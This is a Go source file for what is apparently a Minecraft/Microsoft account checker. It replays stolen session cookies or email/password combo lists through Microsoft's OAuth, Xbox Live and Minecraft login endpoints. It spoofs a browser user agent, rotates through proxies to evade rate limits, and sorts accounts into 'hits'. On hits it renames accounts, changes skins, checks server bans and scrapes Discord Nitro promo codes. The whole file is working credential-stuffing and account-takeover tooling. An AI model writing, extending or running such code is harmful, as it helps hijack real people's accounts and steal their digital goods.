package auth

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

const (
	clientID    = "00000000402b5328"
	redirectURI = "https://login.live.com/oauth20_desktop.srf"
	scope       = "service::user.auth.xboxlive.com::MBI_SSL"

	authorizeURL     = "https://login.live.com/oauth20_authorize.srf"
	xblAuthURL       = "https://user.auth.xboxlive.com/user/authenticate"
	xstsURL          = "https://xsts.auth.xboxlive.com/xsts/authorize"
	mcLoginURL       = "https://api.minecraftservices.com/authentication/login_with_xbox"
	mcProfileURL     = "https://api.minecraftservices.com/minecraft/profile"
	mcEntitlementsURL = "https://api.minecraftservices.com/entitlements/mcstore"

	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)

var accessTokenRe = regexp.MustCompile(`access_token=([^&"' \s]+)`)

type Status string

const (
	StatusHit         Status = "hit"
	StatusNoMinecraft Status = "no_minecraft"
	StatusInvalid     Status = "invalid"
	StatusRateLimited Status = "rate_limited"
	StatusError       Status = "error"
)

type Result struct {
	Status        Status
	File          string
	Email         string
	Password      string // set for combo/ULP checks
	Username      string // original IGN from MC profile
	UUID          string
	AccessToken   string // MC access token; set on HIT for Hypixel join
	OwnsMinecraft bool
	Products      []string
	Reason        string
	HypixelStatus    string // banned | unbanned | never_joined | error | skipped
	HypixelReason    string
	HypixelBanDuration string // "PERMANENT", "29d 14h", or "" if not a timed ban
	// DonutSMP ban check results
	DonutStatus  string // banned | unbanned | never_joined | error | skipped
	DonutReason  string
	// Minemen Club ban check results
	MinemenStatus string // banned | unbanned | never_joined | error | skipped
	MinemenReason string
	// Name / skin change results (populated before Hypixel check when doRename=true)
	NewUsername   string // new IGN after a successful rename; empty if unchanged
	NameChanged   bool
	SkinChanged   bool
	NameChangeErr string // non-empty when rename failed
	SkinChangeErr string // non-empty when skin upload failed
	DiscordCodes  []PromoCode // Discord Nitro promo codes
}

func (r Result) Summary() string {
	if r.Status == StatusHit {
		displayName := or(r.Username, "?")
		if r.NewUsername != "" {
			displayName += " -> " + r.NewUsername
		}
		parts := []string{displayName, or(r.UUID, "?")}
		if r.Email != "" {
			parts = append(parts, r.Email)
		}
		if r.HypixelStatus != "" && r.HypixelStatus != "skipped" {
			hp := "hypixel=" + r.HypixelStatus
			if r.HypixelBanDuration != "" {
				hp += " ban=" + r.HypixelBanDuration
			}
			if r.HypixelReason != "" {
				hp += " (" + r.HypixelReason + ")"
			}
			parts = append(parts, hp)
		}
		if r.NameChangeErr != "" {
			parts = append(parts, "rename_err="+r.NameChangeErr)
		}
		if r.SkinChangeErr != "" {
			parts = append(parts, "skin_err="+r.SkinChangeErr)
		}
		if r.Reason != "" {
			parts = append(parts, r.Reason)
		}
		return strings.Join(parts, " | ")
	}
	if r.Reason != "" {
		return r.Reason
	}
	return string(r.Status)
}

func or(a, b string) string {
	if a != "" {
		return a
	}
	return b
}

type authErr struct {
	msg    string
	status Status
}

func (e *authErr) Error() string { return e.msg }

type Checker struct {
	Client *http.Client
}

// ClientPool caches sticky HTTP clients per proxy so keep-alives stay warm.
type ClientPool struct {
	timeout         time.Duration
	maxConnsPerHost int
	mu              sync.Mutex
	clients         map[string]*http.Client
	direct          *http.Client
}

func NewClientPool(timeout time.Duration, maxConnsPerHost int) *ClientPool {
	if maxConnsPerHost < 1 {
		maxConnsPerHost = 500
	}
	return &ClientPool{
		timeout:         timeout,
		maxConnsPerHost: maxConnsPerHost,
		clients:         make(map[string]*http.Client),
		direct:          NewClient(timeout, maxConnsPerHost, nil),
	}
}

func (p *ClientPool) Client(proxyURL *url.URL) *http.Client {
	if proxyURL == nil {
		return p.direct
	}
	key := proxyURL.String()
	p.mu.Lock()
	defer p.mu.Unlock()
	if c, ok := p.clients[key]; ok {
		return c
	}
	c := NewClient(p.timeout, p.maxConnsPerHost, proxyURL)
	p.clients[key] = c
	return c
}

func NewClient(timeout time.Duration, maxConnsPerHost int, proxyURL *url.URL) *http.Client {
	if maxConnsPerHost < 1 {
		maxConnsPerHost = 500
	}
	transport := &http.Transport{
		MaxIdleConns:          maxConnsPerHost * 2,
		MaxIdleConnsPerHost:   maxConnsPerHost,
		MaxConnsPerHost:       maxConnsPerHost,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:     true,
		DisableCompression:    false,
		// Prefer IPv4 when reaching the proxy (broken AAAA records are common).
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			d := net.Dialer{Timeout: 20 * time.Second}
			if c, err := d.DialContext(ctx, "tcp4", addr); err == nil {
				return c, nil
			}
			return d.DialContext(ctx, network, addr)
		},
	}

	if proxyURL == nil {
		transport.Proxy = http.ProxyFromEnvironment
	} else {
		scheme := strings.ToLower(proxyURL.Scheme)
		switch scheme {
		case "socks5", "socks5h":
			var auth *proxy.Auth
			if proxyURL.User != nil {
				pass, _ := proxyURL.User.Password()
				auth = &proxy.Auth{User: proxyURL.User.Username(), Password: pass}
			}
			dialer, err := proxy.SOCKS5("tcp", proxyURL.Host, auth, &net.Dialer{Timeout: 15 * time.Second})
			if err == nil {
				if cd, ok := dialer.(proxy.ContextDialer); ok {
					transport.DialContext = cd.DialContext
				} else {
					transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
						return dialer.Dial(network, addr)
					}
				}
			}
		default:
			u := proxyURL
			transport.Proxy = http.ProxyURL(u)
		}
	}

	return &http.Client{
		Timeout:   timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func (c *Checker) Check(ctx context.Context, cookieHeader, filename, email string) Result {
	start := time.Now()
	r := Result{File: filename, Email: email}
	msa, err := c.msaToken(ctx, cookieHeader)
	latencyMs := time.Since(start).Milliseconds()

	if err != nil {
		GlobalTelemetry.Update(filename, false, latencyMs)
		return mapErr(r, err)
	}

	r = c.finishFromMSA(ctx, r, msa)
	valid := r.Status == StatusHit || r.Status == StatusNoMinecraft
	GlobalTelemetry.Update(filename, valid, latencyMs)
	
	// Scrape and validate Discord codes if it's a valid Microsoft account
	if valid {
		codes := c.extractCodesFromXbox(ctx, cookieHeader)
		for _, code := range codes {
			promo, _ := ValidateDiscordCode(ctx, code, c.Client)
			if promo != nil {
				r.DiscordCodes = append(r.DiscordCodes, *promo)
			} else {
				r.DiscordCodes = append(r.DiscordCodes, PromoCode{
					Code:      code,
					Source:    "Unvalidated",
					IsValid:   false,
					FetchTime: time.Now().UTC().Format(time.RFC3339),
				})
			}
		}
	}
	
	return r
}

func mapErr(r Result, err error) Result {
	if ae, ok := err.(*authErr); ok {
		r.Status = ae.status
		r.Reason = ae.msg
		return r
	}
	msg := err.Error()
	lower := strings.ToLower(msg)
	switch {
	case strings.Contains(lower, "429"),
		strings.Contains(lower, "rate limit"),
		strings.Contains(lower, "too many requests"),
		strings.Contains(lower, "temporarily unavailable"):
		r.Status = StatusRateLimited
		r.Reason = msg
	default:
		r.Status = StatusError
		r.Reason = msg
	}
	return r
}

// classifyMSFailure maps Microsoft HTML/HTTP failures to invalid vs rate-limited.
func classifyMSFailure(statusCode int, body string) error {
	lower := strings.ToLower(body)
	if statusCode == http.StatusTooManyRequests ||
		strings.Contains(lower, "too many requests") ||
		strings.Contains(lower, "too many times") ||
		strings.Contains(lower, "try again later") ||
		strings.Contains(lower, "request is throttled") ||
		strings.Contains(lower, "exceeded the maximum number") {
		return &authErr{msg: "Microsoft rate limited / throttled", status: StatusRateLimited}
	}
	if strings.Contains(lower, "help us protect your account") ||
		strings.Contains(lower, "prove your identity") ||
		strings.Contains(lower, "enter the code") ||
		strings.Contains(lower, "two-step") {
		return &authErr{msg: "2FA / identity challenge required", status: StatusInvalid}
	}
	if strings.Contains(lower, "your account or password is incorrect") ||
		strings.Contains(lower, "incorrect account or password") ||
		strings.Contains(lower, "that microsoft account doesn't exist") ||
		strings.Contains(lower, "doesn't exist") ||
		strings.Contains(lower, "sign-in name or password") {
		return &authErr{msg: "Invalid email/password", status: StatusInvalid}
	}
	if statusCode == http.StatusUnauthorized || statusCode == http.StatusForbidden {
		return &authErr{msg: fmt.Sprintf("Microsoft auth rejected (HTTP %d)", statusCode), status: StatusInvalid}
	}
	if statusCode >= 500 {
		return &authErr{msg: fmt.Sprintf("Microsoft server error (HTTP %d)", statusCode), status: StatusError}
	}
	if strings.Contains(lower, "login") || strings.Contains(body, "Sign in") {
		return &authErr{msg: "Cookies expired or not logged in", status: StatusInvalid}
	}
	if statusCode > 0 {
		return &authErr{msg: fmt.Sprintf("Microsoft login failed (HTTP %d)", statusCode), status: StatusError}
	}
	return &authErr{msg: "Microsoft password login failed", status: StatusError}
}

func extractAccessToken(raw string) string {
	if raw == "" {
		return ""
	}
	u, err := url.Parse(raw)
	if err == nil {
		if v := u.Query().Get("access_token"); v != "" {
			return v
		}
		if frag := u.Fragment; frag != "" {
			if vals, err := url.ParseQuery(frag); err == nil {
				if v := vals.Get("access_token"); v != "" {
					return v
				}
			}
		}
	}
	if m := accessTokenRe.FindStringSubmatch(raw); len(m) == 2 {
		return m[1]
	}
	return ""
}

func (c *Checker) msaToken(ctx context.Context, cookieHeader string) (string, error) {
	q := url.Values{
		"client_id":     {clientID},
		"response_type": {"token"},
		"scope":         {scope},
		"redirect_uri":  {redirectURI},
		"display":       {"touch"},
		"locale":        {"en"},
	}
	reqURL := authorizeURL + "?" + q.Encode()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, reqURL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Cookie", cookieHeader)
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	resp, err := c.Client.Do(req)
	if err != nil {
		return "", fmt.Errorf("MSA request: %w", err)
	}

	location := resp.Header.Get("Location")
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	resp.Body.Close()

	for hop := 0; hop < 8; hop++ {
		if tok := extractAccessToken(location); tok != "" {
			return tok, nil
		}
		if location == "" {
			break
		}
		next := location
		if strings.HasPrefix(location, "/") {
			base, _ := url.Parse(authorizeURL)
			ref, err := url.Parse(location)
			if err != nil {
				break
			}
			next = base.ResolveReference(ref).String()
		}
		if tok := extractAccessToken(next); tok != "" {
			return tok, nil
		}
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, next, nil)
		if err != nil {
			return "", err
		}
		req.Header.Set("Cookie", cookieHeader)
		req.Header.Set("User-Agent", userAgent)
		resp, err = c.Client.Do(req)
		if err != nil {
			return "", fmt.Errorf("MSA redirect: %w", err)
		}
		location = resp.Header.Get("Location")
		body, _ = io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()
	}

	if tok := extractAccessToken(string(body)); tok != "" {
		return tok, nil
	}
	return "", classifyMSFailure(resp.StatusCode, string(body))
}

func (c *Checker) xboxAuth(ctx context.Context, msaToken string) (string, error) {
	try := func(prefix string) (string, int, error) {
		payload := map[string]any{
			"Properties": map[string]any{
				"AuthMethod": "RPS",
				"SiteName":   "user.auth.xboxlive.com",
				"RpsTicket":  prefix + msaToken,
			},
			"RelyingParty": "http://auth.xboxlive.com",
			"TokenType":    "JWT",
		}
		var out struct {
			Token string `json:"Token"`
		}
		code, err := c.postJSON(ctx, xblAuthURL, payload, &out)
		if err != nil {
			return "", code, err
		}
		return out.Token, code, nil
	}

	token, code, err := try("t=")
	if err == nil && code == 200 && token != "" {
		return token, nil
	}
	token, code, err = try("d=")
	if err != nil {
		return "", err
	}
	if code == http.StatusTooManyRequests {
		return "", &authErr{msg: "Xbox Live rate limited (HTTP 429)", status: StatusRateLimited}
	}
	if code != 200 || token == "" {
		return "", &authErr{msg: fmt.Sprintf("Xbox Live auth failed (%d)", code), status: StatusInvalid}
	}
	return token, nil
}

func (c *Checker) xsts(ctx context.Context, xblToken, relyingParty string) (token, uhs string, err error) {
	payload := map[string]any{
		"Properties": map[string]any{
			"SandboxId":  "RETAIL",
			"UserTokens": []string{xblToken},
		},
		"RelyingParty": relyingParty,
		"TokenType":    "JWT",
	}
	var out struct {
		Token         string `json:"Token"`
		DisplayClaims struct {
			Xui []struct {
				Uhs string `json:"uhs"`
			} `json:"xui"`
		} `json:"DisplayClaims"`
		XErr json.Number `json:"XErr"`
	}
	code, err := c.postJSON(ctx, xstsURL, payload, &out)
	if err != nil {
		return "", "", err
	}
	if code == http.StatusTooManyRequests {
		return "", "", &authErr{msg: "XSTS rate limited (HTTP 429)", status: StatusRateLimited}
	}
	if code == 401 {
		xerr := out.XErr.String()
		switch xerr {
		case "2148916233":
			return "", "", &authErr{msg: "No Xbox profile on this Microsoft account", status: StatusInvalid}
		case "2148916238":
			return "", "", &authErr{msg: "Account is a child / needs adult approval", status: StatusInvalid}
		default:
			return "", "", &authErr{msg: fmt.Sprintf("XSTS unauthorized (XErr=%s)", xerr), status: StatusInvalid}
		}
	}
	if code != 200 || out.Token == "" || len(out.DisplayClaims.Xui) == 0 {
		return "", "", &authErr{msg: fmt.Sprintf("XSTS failed (%d)", code), status: StatusError}
	}
	return out.Token, out.DisplayClaims.Xui[0].Uhs, nil
}

func (c *Checker) mcLogin(ctx context.Context, uhs, xsts string) (string, error) {
	payload := map[string]any{
		"identityToken": fmt.Sprintf("XBL3.0 x=%s;%s", uhs, xsts),
	}
	var out struct {
		AccessToken string `json:"access_token"`
	}
	code, err := c.postJSON(ctx, mcLoginURL, payload, &out)
	if err != nil {
		return "", err
	}
	if code == http.StatusTooManyRequests {
		return "", &authErr{msg: "Minecraft login rate limited (HTTP 429)", status: StatusRateLimited}
	}
	if code != 200 || out.AccessToken == "" {
		return "", &authErr{msg: fmt.Sprintf("Minecraft login failed (%d)", code), status: StatusError}
	}
	return out.AccessToken, nil
}

type mcProfile struct {
	ID   string `json:"id"`
	Name string `json:"name"`
}

func (c *Checker) mcProfile(ctx context.Context, mcToken string) (*mcProfile, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, mcProfileURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+mcToken)
	resp, err := c.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("profile: %w", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode == 404 {
		return nil, nil
	}
	if resp.StatusCode != 200 {
		return nil, nil
	}
	var p mcProfile
	if err := json.Unmarshal(body, &p); err != nil {
		return nil, err
	}
	return &p, nil
}

func (c *Checker) entitlements(ctx context.Context, mcToken string) ([]string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, mcEntitlementsURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+mcToken)
	resp, err := c.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("entitlements: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil, nil
	}
	var out struct {
		Items []struct {
			Name string `json:"name"`
		} `json:"items"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return nil, err
	}
	names := make([]string, 0, len(out.Items))
	for _, it := range out.Items {
		if it.Name != "" {
			names = append(names, it.Name)
		}
	}
	return names, nil
}

func ownsJava(products []string) bool {
	markers := map[string]struct{}{
		"product_minecraft":      {},
		"game_minecraft":         {},
		"product_minecraft_java": {},
		"minecraft":              {},
	}
	for _, p := range products {
		low := strings.ToLower(p)
		if _, ok := markers[low]; ok {
			return true
		}
		if strings.Contains(low, "minecraft") && !strings.Contains(low, "bedrock") {
			return true
		}
	}
	return false
}

func (c *Checker) postJSON(ctx context.Context, rawURL string, payload any, dest any) (int, error) {
	b, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, rawURL, bytes.NewReader(b))
	if err != nil {
		return 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	resp, err := c.Client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return resp.StatusCode, err
	}
	if len(body) > 0 && dest != nil {
		_ = json.Unmarshal(body, dest)
	}
	return resp.StatusCode, nil
}
